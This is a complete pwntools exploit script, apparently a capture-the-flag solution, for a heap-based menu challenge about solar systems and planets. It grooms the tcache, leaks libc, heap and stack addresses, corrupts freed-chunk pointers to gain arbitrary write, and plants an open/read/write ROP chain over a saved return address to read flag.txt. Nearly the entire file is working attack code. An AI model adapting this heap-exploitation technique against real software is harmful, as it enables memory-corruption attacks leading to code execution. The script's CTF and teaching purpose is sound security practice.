#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')



if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def create_solar(name):
    io.sendlineafter(b'Enter your choice\n> ', b'1')
    io.sendlineafter(b'Enter the solar system name\n>> ', name)

def create_planet(idx, size, name):
    io.sendlineafter(b'Enter your choice\n> ', b'2')
    io.sendlineafter(b'Enter the solar system number\n>> ', str(idx).encode())
    io.sendlineafter(b'Choose the planet size\n>> ', str(size).encode())
    io.sendlineafter(b'Enter the planet name\n>> ', name)

def delete_planet(idx, planet_idx):
    io.sendlineafter(b'Enter your choice\n> ', b'3')
    io.sendlineafter(b'Enter the solar system number\n>> ', str(idx).encode())
    io.sendlineafter(b'Enter the planet number\n>> ', str(planet_idx).encode())

def edit_planet(idx,planet_idx, new_name):
    io.sendlineafter(b'Enter your choice\n> ', b'4')
    io.sendlineafter(b'Enter the solar system number\n>> ', str(idx).encode())
    io.sendlineafter(b'Enter the planet number\n>> ', str(planet_idx).encode())
    io.sendlineafter(b'Enter the new planet name\n>> ', new_name)




def show_planet(idx,planet_idx):
    io.sendlineafter(b'Enter your choice\n> ', b'5')
    io.sendlineafter(b'Enter the solar system number\n>> ', str(idx).encode())
    io.sendlineafter(b'Enter the planet number\n>> ', str(planet_idx).encode())

def do_exit():
    io.sendlineafter(b'Enter your choice\n> ', b'6')


gdbscript = '''
b *main+236
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
# io = remote('localhost', 2222)

create_solar(b'toto')

# Fill 0x60 tcache so we are not disturbed by struct system
for _ in range(8):
    create_planet(0, 0x50, b'toto')
for i in range(8):
    delete_planet(0, i)

create_solar(b'toto')
create_planet(1, 0x80+0x10-0x60, b'toto')

for _ in range(8):
    create_planet(0, 0x80, b'toto')

create_planet(1, 0x80, b'toto')

for i in range(6):
    delete_planet(0, i)

delete_planet(0, 7)
delete_planet(0, 6)

create_planet(2, 0x80, b'')
io.sendafter(b'Enter the solar system name\n>> ', b'A'*0x10)

show_planet(2, 0)
libc_leak = u64(io.recvline().strip().ljust(8, b'\0'))
libc.address = libc_leak - 0x1cecc0
log.success(f'{libc.address = :#x}')


create_planet(1, 0x40, b'toto')
create_planet(1, 0x30, b'toto')

for _ in range(8):
    create_planet(0, 0x80, b'toto')

create_planet(1, 0x80, b'toto')

for i in range(6):
    delete_planet(0, i)
delete_planet(0, 7)
delete_planet(0, 6)

create_planet(3, 0x80, b'')
io.sendafter(b'Enter the solar system name\n>> ', b'A'*0x10)

create_planet(3, 0x80, b'flag.txt\0')
create_planet(3, 0x80, b'')

show_planet(3, 0)
heap_leak = u64(io.recvline().strip().ljust(8, b'\0'))
heap_addr = heap_leak - 0x35d0
log.success(f'{heap_addr = :#x}')

edit_planet(3,0, p64(libc.sym['environ']))
show_planet(3, 2)
stack_leak = u64(io.recvline().strip().ljust(8, b'\0'))
saved_rip = stack_leak - 0x120
log.success(f'{saved_rip = :#x}')

create_planet(3, 0x400, b'')
delete_planet(3, 3)

edit_planet(3,0, p64(heap_addr+0x288))
edit_planet(3,2, p64(saved_rip-8))


rop = ROP(libc)
rop.rdi = constants.SYS_open
rop.rsi = heap_addr+0x3540
rop.rdx = 0
rop.rcx = 0
rop.raw(libc.sym['syscall'])

rop.read(3, heap_addr, 0x100)
rop.write(1, heap_addr, 0x100)

p = p64(0xc0febabe) # garbage
p += rop.chain()

create_planet(3, 0x400, p)

do_exit()

io.interactive()

